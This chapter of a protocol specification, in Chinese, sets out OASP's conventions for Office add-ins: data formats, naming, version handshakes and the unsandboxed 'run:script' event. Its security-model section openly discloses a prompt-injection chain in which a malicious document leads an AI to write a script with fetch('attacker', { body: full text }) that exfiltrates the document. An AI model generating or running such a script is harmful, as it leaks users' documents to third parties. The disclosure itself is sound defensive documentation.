# 通用约定

## 概述

本章定义 OASP 协议中的通用约定，包括数据格式、命名规则和序列化规范。所有实现**必须**遵循这些约定。

## 规范分层（Normative / Informative） {#normative-layering}

OASP 是一份**线缆协议（wire protocol）**规范：它约定通信双方在网络上交换什么，而**不约定**任何一端内部如何实现。为防止规范文本越界替消费方做实现决策，全协议内容分为两层。

### 规范层（Normative）

规范层是所有实现**必须**遵守的契约。仅包含**线缆可观测**的内容：

- 事件名与方向（`{namespace}:{action}:{target}`，AddIn→Server / Server→AddIn / 单向通知）
- 请求/响应的字段、形状与类型
- 字段语义（每个字段表示什么）
- 错误码及其**实现中立**的触发条件（描述"出现了何种可观测条件"，而非"因为用了哪种技术"）
- 可观测的顺序、幂等性、持久化与可见性保证（如"`success: true` 后该变更对后续 `get` 可见"）

### 非规范层（Informative）

非规范层是**实现提示**，帮助实现者落地，但**不构成契约**，实现可自由偏离：

- 用什么库或语言、由服务端还是客户端执行某事件、走在线 API 还是离线文件处理
- 性能特征（延迟、吞吐）
- 特定实现路径下的副作用与操作步骤（如某路径需先 `save()`、完成后需重载文档）
- 字段命名与某宿主 API 的对齐关系（便于 `cast` 的提示）

!!! note "标注方式"
    非规范内容应明确标注，例如使用 `!!! info "实现提示（非规范 / Informative）"` admonition，或在行文中以"建议 / 一种可行实现 / 仅供参考"等措辞表达，避免与 MUST 级契约混淆。同一事件可被多种实现路径满足时，规范层只描述对所有路径一致的部分，路径差异下沉到实现提示或消费方仓库。

## 时间戳

### 格式

所有时间戳使用 **Unix 毫秒时间戳**（自 1970-01-01 00:00:00 UTC 以来的毫秒数）。

**正确示例**:
```json
{
  "timestamp": 1704067200000
}
```

**错误示例**:
```json
{
  "timestamp": "2024-01-01T00:00:00Z"
}
```

### 时区

时间戳总是表示 **UTC 时间**，不包含时区信息。客户端负责根据需要转换为本地时区。

### 精度

虽然使用毫秒精度，但实际精度取决于系统实现。通常精度在 1-10 毫秒范围内。

## 字段命名

### 传输层命名

**Socket.IO 传输的 JSON 数据使用 camelCase 命名**。

**正确示例**:
```json
{
  "requestId": "abc123",
  "documentUri": "file:///path/to/doc.docx",
  "isEmpty": true,
  "paragraphCount": 10
}
```

**错误示例**:
```json
{
  "request_id": "abc123",
  "document_uri": "file:///path/to/doc.docx"
}
```

### 命名规则总结

| 场景 | 命名风格 | 示例 |
|------|----------|------|
| JSON 字段名 | camelCase | `documentUri`, `requestId` |
| 事件名 | kebab-with-colon | `word:get:selection` |
| 错误码 | SCREAMING_SNAKE_CASE | `SELECTION_EMPTY` |
| 枚举值 | PascalCase | `InsertionPoint`, `Paragraph` |

## 请求 ID

### 格式

请求 ID 使用 **UUID v4 格式**。

**正确示例**:
```
a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d
```

### 生成

- Server 端生成请求 ID
- 每个请求必须有唯一的 ID
- AddIn 在响应中必须返回相同的请求 ID

### 用途

1. **请求-响应关联**: 将响应与对应的请求匹配
2. **去重**: 识别重复请求
3. **日志追踪**: 跨系统追踪请求链路
4. **超时处理**: 标识超时的请求

## 文档 URI

### 格式

文档 URI 使用 **file:// 协议**。

**格式**:
```
file:///{path}
```

**示例**:
```
file:///Users/john/Documents/report.docx
file:///C:/Users/john/Documents/report.docx
```

### 编码

- 路径中的特殊字符使用 URL 编码
- 空格编码为 `%20`

**示例**:
```
file:///Users/john/My%20Documents/report.docx
```

### 大小写

- macOS/Linux: 区分大小写
- Windows: 不区分大小写

建议实现时统一转换为小写进行比较（在 Windows 上）。

## 字符编码

### 文本内容

所有文本内容使用 **UTF-8 编码**。

### JSON 数据

JSON 数据使用 **UTF-8 编码**，不使用 BOM。

### 换行符

文本内容中的换行符：
- Windows: `\r\n` (CRLF)
- macOS/Linux: `\n` (LF)

建议：AddIn 应保留文档原有的换行符风格，不做自动转换。

## 颜色值

### 格式

颜色使用 **十六进制格式**，带 `#` 前缀。

**支持的格式**:
```
#RRGGBB    // 6 位格式
#RGB       // 3 位简写格式（可选支持）
```

**示例**:
```json
{
  "color": "#FF0000",
  "highlightColor": "#FFFF00"
}
```

### 大小写

颜色值不区分大小写，但建议使用大写字母。

## 数值单位

### 字号

字号使用 **磅 (point)** 为单位。

```json
{
  "fontSize": 12
}
```

### 位置和尺寸

PPT 中的位置和尺寸使用 **磅 (point)** 为单位。

```json
{
  "position": {
    "left": 100,
    "top": 50,
    "width": 200,
    "height": 150
  }
}
```

**换算关系**:
- 1 英寸 = 72 磅
- 1 厘米 ≈ 28.35 磅

### 像素

图片尺寸使用 **像素 (pixel)** 为单位。

```json
{
  "image": {
    "width": 800,
    "height": 600
  }
}
```

## 可选字段

### 空值处理

可选字段为空时：
- 推荐：**省略字段**
- 可接受：设置为 `null`
- 不推荐：设置为空字符串 `""`

**推荐**:
```json
{
  "text": "Hello",
  "format": {
    "bold": true
  }
}
```

**可接受**:
```json
{
  "text": "Hello",
  "format": {
    "bold": true,
    "italic": null
  }
}
```

**不推荐**:
```json
{
  "text": "Hello",
  "format": {
    "bold": true,
    "fontName": ""
  }
}
```

### 默认值

当可选字段省略时，使用文档中指定的默认值。各事件定义中会说明默认值。

## 数组

### 空数组

空数组使用 `[]`，不使用 `null`。

**正确**:
```json
{
  "styles": []
}
```

**不推荐**:
```json
{
  "styles": null
}
```

### 索引

数组索引从 **0** 开始。

```json
{
  "slideIndex": 0,
  "selectIndex": 0
}
```

## 布尔值

布尔值使用 JSON 原生的 `true` / `false`。

**正确**:
```json
{
  "isEmpty": true,
  "matchCase": false
}
```

**错误**:
```json
{
  "isEmpty": "true",
  "matchCase": 0
}
```

## 超时约定

### 默认超时

| 操作类型 | 默认超时 |
|----------|----------|
| 简单查询 | 10 秒 |
| 复杂查询 | 30 秒 |
| 修改操作 | 30 秒 |
| 批量操作 | 60 秒 |
| 脚本执行（`run:script`） | 60 秒（缺省，可经请求 `timeoutMs` 覆盖，**无硬上限**）——详见[§脚本执行](#run-script) |

### 超时处理

1. Server 端应在超时后标记请求为失败
2. 不进行自动重试
3. 返回 `TIMEOUT` 错误码
4. AddIn 收到超时后的响应应忽略

## 协议版本与兼容性 {#versioning}

OASP 体系有三方（AI Agent / Server / AddIn），但**协议层只涉及 Server ↔ AddIn 两端**——AI Agent 通过 MCP/API 接入 Server，不直接参与 Socket.IO 通信。为避免新旧两端在网络上「说不同的话」（协议错位），OASP 在**连接握手阶段**强制校验协议版本：不兼容的 AddIn 在 `connect` 阶段即被拒绝，不会进入业务通信。

本节定义版本号语义与兼容性判定；握手载体与拒绝流程见[连接与握手 · 协议版本握手](connection.md#protocol-version-handshake)，不匹配错误码见[错误处理 · PROTOCOL_VERSION_MISMATCH](error-handling.md#protocol_version_mismatch-2006)。

### 版本号语义（MAJOR.MINOR.PATCH）

协议版本号采用[语义化版本](https://semver.org/lang/zh-CN/)，格式 `MAJOR.MINOR.PATCH`，单一来源为 `pyproject.toml` 的 `version` 字段（当前 `{{ protocol_version }}`，由 `bump-my-version` 管理）。

| 位 | 触发条件（任一即 bump） | 兼容性 |
|----|------------------------|--------|
| **MAJOR** | 删除/重命名事件或字段；更改字段类型、语义或必需性；更改事件命名或路由语义；删除或更改已有错误码 | 不同 MAJOR **完全不兼容** |
| **MINOR** | 新增事件；新增**可选**字段；新增枚举值；新增错误码；新增命名空间 | 见下方判定规则 |
| **PATCH** | bug 修复、文档澄清、错误文案优化（不改变任何线缆可观测行为） | 同 MAJOR.MINOR 内 **永远兼容** |

!!! warning "PATCH 必须 wire 字节兼容"
    PATCH 升级 **MUST** 保持 wire format 字节兼容——不得新增/删除/重命名任何字段（含可选字段）、不得改类型/值域/必需性、不得改事件名或错误码取值。任何改变序列化字节序列的改动 **MUST** 走 MINOR（v0.x 阶段亦视为破坏性变更）。

### 兼容性判定规则 {#compatibility-rule}

握手时由 Server 判定连接的 AddIn 是否兼容。下文 `client` 指 AddIn 在握手中声明的 `oaspVersion`，`server` 指 Server 自身的 OASP 版本。

**v0.x（MAJOR = 0，不稳定阶段）**——任何 MINOR 都可能是破坏性变更，故 **MAJOR.MINOR 必须严格相等**（PATCH 可自由差异）：

```
is_compatible(client, server) =
    client.major == server.major AND client.minor == server.minor
```

**v1.0+（MAJOR ≥ 1，稳定阶段）**——MAJOR 必须相等，且 Server MINOR **必须 ≥** Client MINOR（较新的 Server 向后兼容较旧的 AddIn）：

```
is_compatible(client, server) =
    client.major == server.major AND client.major >= 1 AND client.minor <= server.minor
```

判定公式与 A2C-SMCP 协议一致，升级次序相同：**Server 先于 AddIn 升级**（OASP 中 Server 通常先部署，且是请求发起方）。

!!! note "v1.0+ 已知版本降级（OASP 两方模型独有）"
    Server 在握手时已记录 AddIn 的 `oaspVersion`。v1.0+ 阶段，较新的 Server 向较旧 AddIn 发送请求时 **SHOULD** 避免使用该 AddIn 的 MINOR 尚未引入的事件——握手放行只保证「能连」，避免错位还需 Server 据已知版本自我约束。这是两方单连接模型的便利；A2C 的无状态 HTTP 闸门不持有对端版本，做不到这一点。

参考实现（Python）：

```python
from dataclasses import dataclass


@dataclass(frozen=True)
class OaspVersion:
    major: int
    minor: int
    patch: int

    @classmethod
    def parse(cls, s: str) -> "OaspVersion":
        parts = s.split(".")
        if len(parts) != 3:
            raise ValueError(f"Invalid version: {s}")
        return cls(int(parts[0]), int(parts[1]), int(parts[2]))

    def __str__(self) -> str:
        return f"{self.major}.{self.minor}.{self.patch}"


def is_compatible(client: OaspVersion, server: OaspVersion) -> bool:
    if client.major != server.major:
        return False
    if client.major == 0:
        return client.minor == server.minor   # v0.x 严格匹配 MINOR
    return client.minor <= server.minor        # v1.0+ Server 向后兼容
```

### 版本声明载体（oaspVersion）

AddIn 连接时 **MUST** 在 `auth` 对象中声明 `oaspVersion`（与 `clientId` / `documentUri` 同处一个握手入口）。

- 版本是「能不能说同一种话」（协议层），认证/路由是「你是谁、操作哪个文档」（业务层）；二者同在 `auth`，由 Server 的 `connect` handler 一次性校验
- OASP 是**两方单连接**模型（一个文档仅一个 AddIn 连接），不存在 A2C 三方房间的「传递性」需求（A2C 需保证同房间内 Agent 与 Computer 互相兼容，才把版本闸门下沉到 HTTP 中间件层）。OASP 只有一对端点，`connect` handler 校验 + `ConnectionRefusedError` 携带结构化拒绝数据已足够，**无需**引入 HTTP 中间件
- `oaspVersion` **SHOULD** 由 AddIn SDK 从内置版本常量自动拼入，避免业务代码手动传值导致漂移

### 非目标与边界

- **非目标**（有意排除，保持机制最小）：capabilities 特性发现、自动协商降级、单 Server 实例多协议版本共存、peer-to-peer 协商。多版本并存靠部署拓扑解决——一个 Server 实例只讲一个协议版本。
- **版本握手 ≠ 运行时能力**：协议版本握手回答「两端能不能说同一种 OASP」（连接期、一次性、强制）；运行时能力（如某 Office.js `PowerPointApi` requirement set 1.2 / 1.8 是否可用）回答「这台宿主此刻能不能做某动作」（操作期、按需）。二者**正交**——握手通过不代表某具体能力可用；能力不满足在操作期由 [`3016 API_NOT_SUPPORTED`](error-handling.md) **反应式**处理，不在握手期校验。

## 脚本执行 {#run-script}

本节定义 `{namespace}:run:script`（`excel:run:script` / `word:run:script` / `ppt:run:script`）的共享执行语义、大小限制、超时、安全模型、非原子性与错误映射。三命名空间**语义完全一致**，仅注入的宿主 `context` 不同。请求/结果结构见[数据结构 · 脚本执行](data-structures.md#script-execution)。

### 定位

`run:script` 是**封装层逃生舱（escape hatch）**，**不替代** typed 事件。它服务且仅服务两类场景：① Office.js 有能力但协议尚未封装；② 某 typed 事件有 Bug、修复前该能力归零。调用方**应优先使用 typed 事件**，仅在其覆盖不到或不可用时使用本事件；高频脚本应沉淀为新的 typed 事件——`run:script` 兼作新能力的孵化器。

### 执行语义（规范层）

- 脚本以 **async 函数体**语义执行（等价于 `new AsyncFunction(...)`，**非** `eval`），可用 `await`、可用 `return` 返回结果。
- 注入三个名字：`context`（对应命名空间的宿主 `RequestContext`——Excel `Excel.RequestContext` / Word `Word.RequestContext` / PPT `PowerPoint.RequestContext`）、`args`（请求的 `args`，缺省 `{}`）、`console`（捕获式，输出按序进 `ScriptResult.logs`）。宿主全局 `Excel` / `Word` / `PowerPoint` / `Office` / `OfficeRuntime` / `OfficeExtension` 本就在全局作用域，**不额外注入**。
- 脚本成功结束后，AddIn **MUST** 补一次 `context.sync()`，使「只写不读、未显式 sync」的脚本也落盘。
- `result` 经 `JSON.stringify` + replacer 序列化为纯 JSON：先调 `toJSON()` 再调 replacer，故 Office.js `ClientObject`（Range / Table / Chart …）可直接 `return`，得到其已 `load` 的属性快照；循环引用降级为 `"[Circular]"`，函数字段剔除；无 `return` 时 `result` 为 `null`。

### 大小限制（规范层，线缆字节）

以 **UTF-8 字节**计（**非字符**——CJK 下字节可达字符数三倍，且 socket.io 接收缓冲以字节计）：

- `result` 序列化后 **> 512 KB** → 整请求失败，返回 [`3006 CONTENT_TOO_LARGE`](error-handling.md)（`details.phase:"serialize"`）。大范围数据应改用 typed 事件（如 `excel:get:range`）或在脚本内聚合，不经逃生舱搬运。
- `logs` 总量 **> 100 KB** → 截断并置 `logsTruncated: true`（**不**使请求失败）。单行长度等细分阈值为实现细节。

### 超时（规范层）

- 「脚本执行」档缺省 **60000 ms**，可经请求 `timeoutMs` 覆盖，**无硬上限**（脚本时长只有调用方知道）。
- 超时返回 [`1002 TIMEOUT`](error-handling.md)（`details.phase:"execute"`，带截断前 `logs`）。
- **非抢占局限**：超时后 AddIn **应尽力中止**（如在后续 `await context.sync()` 处拒绝），但**同步 JS 不可抢占**——脚本内的同步长循环会独占宿主线程直至自行结束，超时计时器亦无法插入。调用方**不得**假设超时即刻停机，须结合下节[非原子性](#run-script-atomicity)理解可能的残留副作用。

### 安全模型（规范层，MUST 阅读）

!!! danger "这不是沙箱，且沙箱与本事件的目的在定义上互斥"
    `run:script` 以 `AsyncFunction` 执行仅隔掉宿主的**局部词法作用域**，**全局对象完全敞开**——脚本可触达 `window` / `fetch` / `localStorage` / Socket.IO client 本身。叠加 manifest 的 `ReadWriteDocument`：**谁能下发脚本，谁就完全控制用户文档与该 taskpane 的浏览器上下文。**

- **沙箱化会摧毁本事件的价值**：Office.js 对象是绑定在 AddIn 页面 realm 上的代理对象，无法穿越 iframe / Worker 隔离边界；给脚本套可序列化 RPC 门面即等于重新发明 Office Scripts 的受限 API，而「直接调原生 Office.js」正是本事件的全部价值。故本协议**有意不引入**任何脚本沙箱。
- **信任边界 = 握手鉴权**：安全性 100% 依赖脚本来源可信度，即 Socket.IO 连接握手的鉴权（见[连接与握手](connection.md)）。这是防线的全部，不存在其他「防护」。
- **本事件独有的攻击面**：typed 事件只能把文档内容发回已认证的自有 Server；脚本能触达 `fetch`，可发往**任意第三方**。而 Office 文档本身是攻击者可控输入，故存在「恶意文档提示词注入 → AI 读文档 → AI 生成含 `fetch('attacker', { body: 全文 })` 的脚本 → 执行外泄」这条 **typed 事件不可达**的链路。规范如实记录此链，不淡化。
- **人在环确认不在 OASP**：对「执行前是否要终端用户确认」的把关由**上层 Agent 层**承担——Agent 宿主对**任意** MCP 工具调用统一提供二次确认（如 permission prompt）。OASP / AddIn 为**纯能力提供方**，`run:script` 与其余 typed 事件一样静默放行、**不自建确认门、不提供安全边界**。若 Agent 宿主被配置为自动批准，该确认随之失效——这是宿主配置域的责任，OASP 不兜底。

### 非原子性（规范层）{#run-script-atomicity}

!!! warning "run:script 不提供任何原子性 / 回滚保证"
    与 typed 事件不同，`run:script` 失败时**文档可能处于任意中间状态**。非原子性有两层，Office.js 均无事务 / 回滚 API 可消除：

    1. **跨 sync 非原子**：脚本「写 A → `await sync()` → 写 B → throw」时，A 已往返落盘、不可回滚；B 尚在本地命令队列、随失败丢弃。即 **throw 前每次成功 sync 的写入全部残留**。
    2. **单次 sync 内部非原子**：一次 `sync()` 把命令队列整批发往宿主，宿主按序执行、在首条失败命令处停止、**之前的命令不回滚**。故哪怕只有一次 sync 也可能残留半批写入。

    需要对账的调用方**应在脚本内自行 read-back** 校验最终状态。

### 错误映射（规范层）{#run-script-errors}

`details` 是本事件的核心——脚本多由 LLM 生成，靠回包自我修正。全部复用[共享错误码注册表](error-handling.md)，**零新增码**：

| 触发条件（线缆可观测） | 错误码 | `details` |
|---|---|---|
| 缺 `script` | `4001 MISSING_PARAM` | — |
| `timeoutMs` 越界（如负数） | `4004 PARAM_OUT_OF_RANGE` | — |
| `args` 不可 JSON 序列化 | `4003 INVALID_PARAM_TYPE` | — |
| 脚本**语法错**（编译期拦下，未触碰文档） | `4002 INVALID_PARAM` | `phase:"compile"`, `name`, `stack` |
| 宿主**不支持动态代码构造**（CSP 拦截 `AsyncFunction`，编译期，未触碰文档） | `3016 API_NOT_SUPPORTED` | `phase:"compile"` |
| 脚本**自身抛错**（TypeError / ReferenceError / 主动 throw） | `3004 OPERATION_FAILED` | `phase:"execute"`, `fault:"script"`, `name`, `stack`, `logs` |
| 脚本调用 **Office.js 失败** | `3004 OPERATION_FAILED` | `phase:"execute"`, `fault:"office"`, `officeCode`, `debugInfo?`, `stack`, `logs` |
| 执行**超时** | `1002 TIMEOUT` | `phase:"execute"`, `logs` |
| `result` **过大**（见大小限制） | `3006 CONTENT_TOO_LARGE` | `phase:"serialize"` |

- `phase` ∈ `"compile" | "execute" | "serialize"`，标识失败阶段。
- `fault` ∈ `"script" | "office"`（仅 `execute` 阶段），区分「脚本自身缺陷」与「文档操作被宿主拒绝」——AI 据此决定**重写脚本** vs **调整操作**。判据为 `error instanceof OfficeExtension.Error`。
- `officeCode` = `OfficeExtension.Error.code`（如 `InvalidArgument` / `ItemNotFound`）。`debugInfo` 为 `OfficeExtension.DebugInfo` 的**不透明透传**，其 `errorLocation` 等字段**可缺省**（`GeneralException` 常无），消费方**不得**假设其存在。

!!! note "compile 期语义安全"
    语法错与 CSP 拦截均在 `AsyncFunction` 构造期发生，**先于**任何 `*.run` 调用——`RequestContext` 尚未创建、文档零接触，故这两类失败**保证无副作用**。
